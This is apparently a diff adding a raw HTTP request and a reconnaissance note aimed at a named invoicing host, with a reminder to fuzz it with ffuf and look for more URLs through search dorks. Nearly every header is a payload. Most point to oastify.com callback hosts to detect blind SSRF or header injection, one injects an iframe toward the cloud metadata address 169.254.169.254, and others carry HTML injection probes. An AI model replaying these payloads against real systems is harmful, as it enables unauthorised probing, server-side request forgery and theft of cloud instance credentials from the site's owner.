@@ -1,0 +1,36 @@
+POST /post.pdf?method=test7&version=2&_method=trace HTTP/2
+Host: bw.invoice.be.mi.com
+Cache-Control: no-transform
+Sec-Ch-Ua: 
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: ""
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@0wx7esuullbczdv3t182530rvi1it6i.oastify.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document<img>
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Client-Ip: spoofed.mxntfevgm7cy0zwpun9o6p1dw4235ru.oastify.com
+Referer: http://jxkqfbvdm4cv0wwmuk9l6m1aw1206ov.oastify.com/ref
+X-Forwarded-For: <img></img><iframe src=http://169.254.169.254/latest/dynamic/instance-identity/document>:
+Cf-Connecting_ip: spoofed.w853qo6qxhn8b97z5xkyhzcn7ede32s.oastify.com
+X-Real-Ip: spoofed.hqbo89obf25ttupkni2jzku8pzvzmnb.oastify.com
+X-Client-Ip: spoofed.h5non93bu2kt8u4k2ihjek984zaz3ns.oastify.com
+Forwarded: for=spoofed.4w1bewuylpbgzhv7t586570vvm1mvak.oastify.com;by=spoofed.4w1bewuylpbgzhv7t586570vvm1mvak.oastify.com;host=spoofed.4w1bewuylpbgzhv7t586570vvm1mvak.oastify.com
+True-Client-Ip: spoofed.vut2cnspjg97x8tyrw6x3yymtdzdu1j.oastify.com
+Contact: root@tif00lgn7ex5l6hwfuuvrwmkhbnbjz8.oastify.com
+From: root@5ntc5xlzcq2hqim8k6z7w8rwmnsnpbe.oastify.com
+X-Originating-Ip: spoofed.9v5gd1t3kualymucsa7b4cz0ur0ryfn.oastify.com
+X-Wap-Profile: http://euclc6s8jz9qxrthrf6g3hy5twzwykn.oastify.com/wap.xml
+Content-Length: 6
+
+test=1
+
+
+
+
+#######################
+https://bw.invoice.be.mi.com/post.html?id=1 (only need to fuzzing post method with ffuf and check for more url with dork) (remember to do this now)
